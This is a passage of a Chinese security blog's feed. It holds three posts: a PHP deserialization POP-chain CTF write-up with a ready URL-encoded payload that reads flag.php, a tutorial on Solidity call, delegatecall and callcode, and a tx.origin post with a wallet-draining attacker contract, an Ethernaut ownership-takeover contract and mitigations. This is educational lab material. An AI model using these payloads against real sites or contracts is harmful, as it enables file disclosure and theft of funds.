class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码分析：</p><p><strong>GET</strong> 请求的 <strong>pop</strong> 参数可控，利用 <strong>Modifier</strong> 类中的 <strong>append</strong> 方法就可以包含 <strong>flag</strong>，实例化一个对象时会先执行对象中的 <code>__wakeup()</code> 方法，而 <strong>Show</strong> 类中的 <code>__wakeup</code> 方法的 <strong>source</strong> 也可控，可以构造 <strong>pop</strong> 链：</p><ul><li>构造 <code>$source = new Show</code>，在 <strong>Show</strong> 中首先执行 <code>__wakeup</code>方法，又因为  <code>__wakeup</code> 方法中的 <code>source</code> 参数指向一个类，当类被用作字符串输出时会触发该类的 <code>__toString()</code> 方法</li><li>再构造 <strong>Show</strong> 中的 <strong>str</strong> 参数，使 <code>$str = new Test</code>，当执行 <code>__toString()</code> 方法时，<code>return $this-&gt;str-&gt;source</code>会取 str(new Test) 类中的 <strong>source</strong> 值，当读取不可访问（protected 或 private）或不存在的属性的值时会去调用 <code>__get()</code> 方法，即 <strong>Test</strong> 类中的 <code>__get()</code> 方法；</li><li>执行 <code>__get()</code> 方法时会返回一个 <strong>function</strong>，构造 <code>$p = new Modifer</code>，即将类变量作为函数去调用，此时会执行该类中的 <code>__invoke()</code> 方法；</li><li>最后构造 <code>$var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</code>，在执行 <strong>__invoke()</strong> 方法时将 <strong>var</strong> 作为参数去调用 <strong>Modifer</strong> 类下的 <strong>append</strong> 方法，最后利用 <strong>php://</strong> 伪协议读取 <strong>flag</strong>。</li></ul><p>所以最终的 <strong>payload</strong> 为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; source = <span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line">var_dump(urlencode(serialize(<span class="variable">$b</span>)));  </span><br><span class="line"><span class="comment">//因为 $var 为 protected变量，所以需要添加\0*\0，这里使用 urlencode编码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//payload O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A0%3A%22%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>整个流程结构如下图：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt="4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="反序列化" scheme="https://banana69.site/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Solididy合约调用</title>
    <link href="https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/"/>
    <id>https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/</id>
    <published>2021-10-15T01:24:02.000Z</published>
    <updated>2021-10-17T12:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Solidity</strong> 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。</p><h4 id="一、创建新实例"><a href="#一、创建新实例" class="headerlink" title="一、创建新实例"></a>一、创建新实例</h4><p>调用另一份合约最安全的方法是创建其他合约，以确定它的接口和行为来实例化它，通过关键字 <strong>new</strong> 来实例化需要调用的合约。在 <strong>Solidity</strong> 中，关键字 <strong>new</strong> 将在区块链上创建合约并返回一个可用于引用它的对象。</p><p>例如以下合约从另一个名为 <strong>Token</strong> 的合约中创建并调用 <strong>Faucet</strong> 合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Faucet&#123;</span><br><span class="line">    function withdraw(uint withdraw_amount) public &#123;</span><br><span class="line">        require(withdraw_amount &lt;= 100000000000000000);</span><br><span class="line">        msg.sender.transfer(withdraw_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = new Faucet();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>new</strong> 关键字还可以接受可选参数来指定创建时传输的 <strong>Ether</strong> 值，以及传递给新合约的构造函数的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = (new Faucet).value(0.5 ether)();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二、访问现有实例"><a href="#二、访问现有实例" class="headerlink" title="二、访问现有实例"></a>二、访问现有实例</h4><p>可以将现有合约的地址转换为实例来实现合约的调用，即将某个地址强制转换为某个合约类型，使用这种方法时已知接口应用于现有的实例。</p><p>如以下合约将地址作为参数提供给构造函数，并将其强制转换为合约对象：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Fucet&#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor(address _addr)&#123;</span><br><span class="line">_faucet = Faucet(_addr);</span><br><span class="line">_faucet.withdraw(0.1 ether);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的代码存在一定的风险，例如无法确定传入构造函数的地址是否是 Faucet 对象，也无法确定调用 <strong>withdraw</strong> 函数时是否可以与预期结果一致。</p><h4 id="三、底层函数调用"><a href="#三、底层函数调用" class="headerlink" title="三、底层函数调用"></a>三、底层函数调用</h4><p><strong>Solidity</strong> 提供了几种底层调用合约的方式，例如<code>call</code>，<code>delegatecall</code>和<code>codecall</code>，<code>call</code>的外部调用上下文是外部合约，而<code>delegatecall</code>的外部调用上下文是调用者合约，<code>callcode</code>的外部调用上下文是调用者合约，这里借用<strong>rickgray</strong>师傅的图：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/1.png" alt="1"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 调用外部合约 <strong>B</strong> 的 <strong>fun()</strong> 时，<strong>fun()</strong> 在 合约 <strong>B</strong> 的上下文执行，然后继续返回 合约 <strong>A</strong> 中继续执行，该调用会将内置的 <strong>msg.sender</strong> 的值修改为调用者；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值。</p><blockquote><p>这里区分一下 <strong>tx.origin</strong> 和 <strong>msg.sender</strong> ，<strong>msg.sender</strong> 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 <strong>tx.origin</strong> 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</p></blockquote></li></ul><p>从以下代码分析三种调用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    address public address_A;</span><br><span class="line">    uint256 public num_A;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    function call(address addr) public &#123;</span><br><span class="line">        addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function delegatecallcall(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function callcode(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    address public address_B;</span><br><span class="line">    uint256 public num_B = 100;</span><br><span class="line">    </span><br><span class="line">    function test() public &#123;</span><br><span class="line">        address_B = msg.sender;</span><br><span class="line">        num_B = 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从账户<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>分别部署合约 <strong>A</strong> 和 合约 <strong>B</strong>，可以看到合约 <strong>B</strong> 未被调用时的 <strong>msg.sender</strong> 和 <strong>num_b</strong> 分别如下图所示：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/2.png" alt="2"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 方式 调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p><strong>test()</strong> 函数的执行环境是在合约 <strong>B</strong> 中，所以此时的 <strong>msg.sender</strong> 是调用者的合约地址，即合约 <strong>A</strong> 的地址，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 和 <strong>num_A</strong> 仍未改变；<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/3.png" alt="3"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>此时 <strong>test()</strong> 函数的执行环境是在合约 <strong>A</strong> 中，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的外部账户的地址，即部署合约 <strong>A</strong> 的账户的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。</p><p>但此时合约 <strong>A</strong> 中的 <strong>num_A</strong> 会被覆盖。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/4.png" alt="4"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>通过 <strong>callcode</strong> 调用时的上下文为调用者合约，即 <strong>test()</strong> 函数的执行环境为合约 <strong>A</strong>，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的合约的地址，即合约 <strong>A</strong> 的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/5.png" alt="5"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Solidity&lt;/strong&gt; 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。&lt;/p&gt;
&lt;h4 id=&quot;一、创建新实例&quot;&gt;&lt;a href=&quot;#一、创建新实例&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>tx.origin 引发的安全问题</title>
    <link href="https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</id>
    <published>2021-10-09T04:42:54.000Z</published>
    <updated>2022-05-05T07:41:20.130Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p><strong>tx.origin</strong> 是 <strong>Solidity</strong> 中的一个全局变量，它能够遍历调用栈并返回最初发送调用的账户地址，因此使用 <strong>tx.origin</strong> 进行身份验证时存在一定的安全问题，所以一般在合约中避免使用 <strong>tx.origin</strong> 进行身份验证。</p><p>通过以下代码了解：<strong>tx.origin</strong> 与 <strong>msg.sender</strong> 的区别：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setOwner() &#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setOwner() &#123;</span><br><span class="line">owner = tx.origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用链<code>A -&gt; B -&gt; C- &gt; D</code>中，若 <strong>D</strong> 内部的全局变量是 <strong>msg.sender</strong>， 它将指向最近的一笔交易，即是 <strong>C</strong>；若 <strong>D</strong> 内部的全局变量是 <strong>tx.origin</strong>，它将指向最初发送交易的账户地址，即是 <strong>A</strong>。</p><p> <strong>tx.origin</strong> ：</p><ul><li>只有用户钱包地址可以是 <strong>tx.origin</strong> （或合约拥有者的地址）；</li><li>可能是整个交易或调用链的原始调用者；</li><li>不可能是合约地址。</li></ul><p><strong>msg.sender</strong>:</p><ul><li>可能是特定交易或调用的发送者；</li><li>用户钱包或智能合约都可以是 <strong>msg.sender</strong>。</li></ul><h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>以下钱包合约使用 <strong>tx.origin</strong> 做身份认证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract TxUserWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxUserWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferTo(address dest, uint amount) public &#123;</span><br><span class="line">        require(tx.origin == owner);</span><br><span class="line">        dest.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约将合约所有者 <strong>owner</strong> 变量赋值给 <strong>tx.origin</strong> 变量，所以当 <strong>tx.origin</strong> 值为攻击者的地址时，会向攻击者进行转币操作，以下是攻击者合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">interface TxUserWallet &#123;</span><br><span class="line">    function transferTo(address dest, uint amount) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TxAttackWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxAttackWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public &#123;</span><br><span class="line">        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设<strong>TxUserWallet</strong> 合约为 <strong>A</strong>，<strong>TxAttackWallet</strong> 合约为 <strong>B</strong>，首先 <strong>A</strong> 向 <strong>B</strong> 发送一定量的以太币，此时 <strong>A</strong> 的 <strong>owner</strong> 为合约 <strong>A</strong> 的地址，然后在 <strong>fallback</strong> 函数中调用 <strong>A</strong> 合约时，<strong>A</strong> 合约中的 <strong>tx.origin</strong> 为合约 <strong>A</strong> 的地址，所以会绕过 <strong>require()</strong> 的判断，完成转币操作。 </p><p>事实上，<strong>tx.origin</strong> 一般为合约拥有者的地址。</p><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>以 <strong>ethernaut</strong> 中的 <strong>Telephone</strong> 为例，需要成为合约拥有者即可通过该挑战，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以知道只需要通过 <strong>if</strong> 判断即可设置合约的拥有者，这里使用了 <strong>tx.origin</strong>，使用以下攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Call_Telephone&#123;</span><br><span class="line">    Telephone telephone;</span><br><span class="line">    </span><br><span class="line">    function set_contract(address _Telephone_Addr) public&#123;</span><br><span class="line">        telephone = Telephone(_Telephone_Addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function call_changeOwner() public &#123;</span><br><span class="line">        telephone.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过攻击合约去调用 <strong>Telephone</strong> 合约中的 <strong>changeOwner()</strong> 函数，当调用发生时，<strong>if</strong> 中的 <strong>tx.origin</strong> 为攻击者合约拥有者的地址，而 <strong>msg.sender</strong> 为合约 <strong>Telephone</strong> 的地址，所以通过 <strong>if</strong> 判断，获取合约所有权。</p><h4 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h4><p>在智能合约的鉴权机制中减少 <strong>tx.origin</strong>的使用。</p><p>通常使用 <strong>tx.origin</strong> 来区分调用者是一个账户而不是一个合约。</p><p>如：<code>if(msg.sender == tx.origin)</code>，如果调用者是一个账户，则上面的条件永远是 <strong>True</strong>，如果是合约账户，则为 <strong>False</strong>。</p><p>还可以通过<code>extcodesize(addr)</code>来判断地址是否为合约地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract assertContract &#123;</span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若只允许外部账户调用我们的合约，不允许合约账户调用我们的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(tx.origin == msg.sender)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;tx.origin&lt;/strong&gt; 是 &lt;strong&gt;Solid</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
